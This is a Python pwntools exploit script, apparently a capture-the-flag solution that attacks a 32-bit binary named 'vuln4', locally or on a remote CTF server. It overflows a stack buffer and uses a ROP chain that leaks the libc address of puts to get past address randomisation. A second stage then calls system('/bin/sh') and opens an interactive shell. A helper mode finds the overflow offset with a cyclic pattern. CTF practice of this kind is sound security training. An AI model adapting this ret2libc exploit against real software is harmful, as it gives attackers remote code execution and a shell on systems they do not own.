#!/usr/bin/env python

from pwn import *
import optparse

context.update(os="linux", bits=32, endian="little", log_level="info")
e=ELF("./vuln4")
libc=ELF("./libc.so.6")
binsh_offset=0x0015ba0b
puts_offset=libc.symbols["puts"]
system_offset=libc.symbols["system"]
main=e.symbols["main"]
puts_plt=e.symbols["puts"]
puts_got=e.got["puts"]
pop_ebx=0x08048359

def sploit():
    #pid=util.proc.pidof(p)[0]
    #util.proc.wait_for_debugger(pid)
    offset=22
    rop = ROP(e)
    rop.puts(e.got['puts'])
    rop.call(e.symbols['main'])

    print rop.dump()
    payload="a"*offset+str(rop)
    #payload="a"*offset+flat(p32(puts_plt),p32(puts_got),p32(pop_ebx),"b"*4)
    p.sendlineafter("yourself\n",payload)
    leak_libc=u32(p.recvline()[:4])-puts_offset
    log.info("Leaked libc addy: {}".format(hex(leak_libc)))
    system=leak_libc+system_offset
    binsh=leak_libc+binsh_offset
    stage2="a"*offset+p32(system)+"bbbb"+p32(binsh)
    p.sendlineafter("yourself\n",stage2)
    p.interactive()

def main():
    parser=optparse.OptionParser()
    parser.add_option("--debug","-d",action="store_true")
    parser.add_option("--cyclic","-c",action="store_true")
    options, args = parser.parse_args()

    if options.debug:
        print "DEBUG MODE"
        global p
        p=process(e.path)

        if options.cyclic:
            print "Fetching PC's offset..."
            pattern=cyclic(128)
            p.sendlineafter("yourself\n",pattern)
            p.wait()
            core=p.corefile
            pc=core.read(core.esp,4)
            log.info("pc: {}".format(pc))
            offset=cyclic_find(pc)
            log.success("offset: {}".format(offset))
        else:
            sploit()

    else:
        p=remote("ctf.sharif.edu",4801)
        sploit()

if __name__ == '__main__':
    main()